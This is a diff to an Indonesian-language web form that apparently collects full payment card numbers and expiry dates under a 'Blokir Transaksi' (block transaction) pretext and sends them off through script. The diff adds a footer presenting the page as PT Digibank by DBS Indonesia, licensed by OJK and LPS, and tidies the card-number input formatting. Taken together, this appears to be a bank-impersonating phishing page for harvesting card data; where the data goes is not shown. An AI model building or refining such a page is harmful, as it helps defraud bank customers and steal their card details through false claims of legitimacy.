@@ -271,14 +271,11 @@
 <input
   type="text"
   inputmode="numeric"
-  pattern="\d*"
-  maxlength="19" <!-- 16 angka + 3 spasi -->
   class="form-control text-center"
   id="cardNumber"
   placeholder="Masukkan 16 digit Nomor kartu"
   required
 />
-
 
             </div>
             <div class="row g-2 mb-3">
@@ -310,13 +307,20 @@
               </div>
             </div>
           <button type="submit" class="btn btn-danger btn-block">Blokir Transaksi</button>
+<div class="max-w-6xl mx-auto px-4 py-6 text-center text-[10px] text-gray-600" style="font-size: 10px; margin-top:20px ;">
+  PT Digibank by DBS Indonesia Tbk. berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS).
+</div>
 
           </form>
         </div>
       </div>
 
       <!-- FOOTER -->
-   
+    <!-- Footer -->
+<footer class="bg-white border-t mt-10">
+ 
+</footer>
+
 
       <!-- Script -->
     <script>
@@ -337,6 +341,23 @@
         .trim()
         .padEnd(19, "•");
     });
+
+
+    
+  cardInput.addEventListener('input', function (e) {
+    // Ambil angka saja
+    let value = e.target.value.replace(/\D/g, '');
+
+    // Potong maksimal 16 digit
+    if (value.length > 16) {
+      value = value.substring(0, 16);
+    }
+
+    // Tambahkan spasi tiap 4 digit
+    let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
+
+    e.target.value = formatted;
+  });
 
     // Format Valid Thru
     validThru.addEventListener("input", () => {
@@ -391,25 +412,7 @@
         alert("Gagal mengirim data. Coba lagi.");
       });
     });
-
-      
-  const cardInput = document.getElementById('cardNumber');
-
-  cardInput.addEventListener('input', function (e) {
-    // Hapus semua spasi dan non-digit
-    let value = e.target.value.replace(/\D/g, '');
-    
-    // Batasi ke 16 digit
-    value = value.slice(0, 16);
-
-    // Tambahkan spasi setiap 4 digit
-    let formatted = value.replace(/(.{4})/g, '$1 ').trim();
-
-    e.target.value = formatted;
-  });
-
   </script>
-
 
     </body>
   </html>
